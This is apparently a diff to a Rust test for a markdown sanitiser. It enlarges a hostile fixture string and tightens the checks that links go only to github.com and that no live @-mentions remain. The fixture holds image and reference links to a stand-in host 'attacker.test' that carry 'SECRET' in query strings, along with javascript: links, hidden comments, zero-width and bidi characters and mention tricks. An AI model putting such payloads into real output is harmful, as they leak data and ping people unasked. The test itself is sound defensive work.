@@ -5,6 +5,7 @@
 mod common;
 
 use common::harness::{FIXTURE, Options, World};
+use common::spans::assert_no_live_mention;
 use common::transports::LosesAnswers;
 use factory_domain::values::Slug;
 use factory_domain::vocabulary::StageKind;
@@ -161,7 +162,15 @@ const HOSTILE: &str = "Result: ![x](https://attacker.test/?d=SECRET) and <img sr
 <a href=\"https://attacker.test/a\">a</a> and [x](javascript:alert(1)).\n\n\
 [ref]: https://attacker.test/?d=SECRET\n\n\
 <!-- hidden: SECRET -->zero\u{200b}width\u{202e}text\n\n\
-@alice @bob @org/team @carol @dave and other/repo#12 and www.attacker.test/x";
+@alice @bob @org/team @carol @dave and other/repo#12 and www.attacker.test/x\n\n\
+Linked images: [![chart](//attacker.test/b.png?d=1)](https://github.com/example-org/fixture) and \
+[![chart][r2]](https://github.com/example-org/fixture) and \
+[![t](https://github.com/example-org/fixture/raw/main/a.png)](//attacker.test/l)\n\n\
+> [r2]: //attacker.test/c.png\n\n\
+- [r3]: //attacker.test/d.png\n\n\
+A lone backtick: `@example-org/security-team now, and see `victim/repo#12 for details.\n\n\
+`@one` and `x `@two\n\n\
+| `@cell | other` |";
 
 fn assert_clean(text: &str, what: &str) {
     // The one hidden comment the adapter itself adds is the marker of a comment.
@@ -178,7 +187,6 @@ fn assert_clean(text: &str, what: &str) {
         "<!--",
         "javascript:",
         "![",
-        "](http",
         "]: ",
     ] {
         assert!(
@@ -190,14 +198,17 @@ fn assert_clean(text: &str, what: &str) {
         text.chars().all(|c| !matches!(c, '\u{200b}' | '\u{202e}')),
         "{what}: hidden characters"
     );
-    for (index, c) in text.char_indices() {
-        if c == '@' {
-            assert!(
-                text[..index].ends_with('`'),
-                "{what}: an active mention at {index}: {text}"
-            );
-        }
+    // Every link that is left points at the code host and nowhere else.
+    for (at, _) in text.match_indices("](http") {
+        assert!(
+            text[at..].starts_with("](https://github.com/"),
+            "{what}: a link to another host: {text}"
+        );
     }
+    // No mention and no reference to another repository outside a code span. The check reads the
+    // text the way CommonMark reads backtick strings and shares no code with the filter; the check
+    // it replaces ("every `@` is preceded by a backtick") was satisfied by a lone backtick.
+    assert_no_live_mention(&text, what);
     assert!(
         !text.contains(" other/repo#12"),
         "{what}: a cross-repository reference"
